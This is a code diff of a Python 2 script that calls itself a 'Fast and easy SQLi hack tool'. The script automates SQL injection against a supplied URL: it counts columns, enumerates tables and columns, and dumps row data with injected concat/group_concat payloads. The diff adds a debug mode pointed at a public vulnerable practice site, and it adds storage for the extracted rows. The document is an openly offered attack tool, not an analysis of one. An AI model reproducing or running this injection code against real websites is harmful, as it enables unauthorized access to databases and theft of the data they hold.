@@ -1,7 +1,14 @@
+# Facebook: https://www.facebook.com/TheCybersTeam
+# Group:    https://www.facebook.com/groups/TheCybersTeam
+# Channel:  https://www.youtube.com/channel/UCKFMv1cifW55lKKps2thhbw
+# Greatz:   quintanilhaedu
+
 import urllib as cybers
 import sys
 import os
 import platform
+
+debug = 0
 
 clear = "clear"
 if platform.system() == "Windows":
@@ -9,16 +16,15 @@ if platform.system() == "Windows":
 os.system(str(clear))
 
 header="""
-____ _              ___      _                     _____                      
+  ____ _              ___      _                     _____                      
 /__   \ |__   ___    / __\   _| |__   ___ _ __ ___  /__   \___  __ _ _ __ ___  
   / /\/ '_ \ / _ \  / / | | | | '_ \ / _ \ '__/ __|   / /\/ _ \/ _` | '_ ` _ \ 
  / /  | | | |  __/ / /__| |_| | |_) |  __/ |  \__ \  / / |  __/ (_| | | | | | |
  \/   |_| |_|\___| \____/\__, |_.__/ \___|_|  |___/  \/   \___|\__,_|_| |_| |_|
-                         |___/                                                 
+                         |___/                                               
 
 More: https://www.facebook.com/TheCybersTeam
-Usage: python sqli.py --url http://testphp.vulnweb.com/listproducts.php?cat=1
-Fast and easy SQLi hack tool Beta 1.7
+Fast and easy SQLi hack tool Beta 1.8
 """
 print header
 
@@ -26,6 +32,8 @@ for k, v in enumerate(sys.argv):
     if v == "--url":
         try:
             u = sys.argv[k+1]
+            if debug == 1:
+                u = "http://testphp.vulnweb.com/listproducts.php?cat=1"
             pos = u.find("=")
             url = u[:pos+1]
         except:
@@ -70,7 +78,10 @@ def countColumns(url):
     return 0
 
 try:
-    columns = countColumns(url)
+    if debug == 1:
+        columns = 11
+    else:
+        columns = countColumns(url)
 except:
     pass
 
@@ -155,10 +166,13 @@ def getTables(database,vulCol,columns, url):
 class Tb:
     name = None
     columns = []
+    rows = []
     def setName(self,name):
         self.name = name
     def setColumns(self,columns):
         self.columns = columns
+    def setDatas(self,rows):
+        self.rows = rows
 
 tbs = []
 tables = getTables(database,vulCol,columns, url)
@@ -171,7 +185,10 @@ dbs[0].setTables(tbs)
 print "Tables: "+tables
 
 sys.stdout.write("\nTable: ")
-table = raw_input()
+if debug == 1:
+    table = "artists"
+else:
+    table = raw_input()
 
 def getColumns(table,database, volCol, columns, url):
     global build
@@ -187,7 +204,11 @@ dbs[0].tables[0].setColumns(cls)
 print "Columns: "+cols
 
 sys.stdout.write("\nColumns names: ")
-column = raw_input()
+if debug == 1:
+    column = "artist_id,aname"
+    print "\n"
+else:
+    column = raw_input()
 cols = column.split(",")
 
 def getData(cols, table,database, volCol, columns, url):
@@ -203,22 +224,25 @@ def getData(cols, table,database, volCol, columns, url):
         if i !=0:
             line+=",0x3a,"
         line+=name
-        i = i + 1
+        i+=1
 
     url = build[0] + "concat(0x27,0x23,group_concat("+line+"),0x23,0x27)" + build[1]+ " from+"+table
     res = getContent(url)
     data = getVars(res)
     rows = data.split(",")
 
+    vector = []
     for j in rows:
-        i = 0
+        i=0
         col = j.split(":")
-        
+        temp = []
         for k in col:
+            temp.append(k)
             if len(k) > space[i]:
                 space[i] = len(k)
             i=i+1
-
+        vector.append(temp)
+    dbs[0].tables[0].setDatas(vector)
     line = ""
     i=0
     for j in cols:
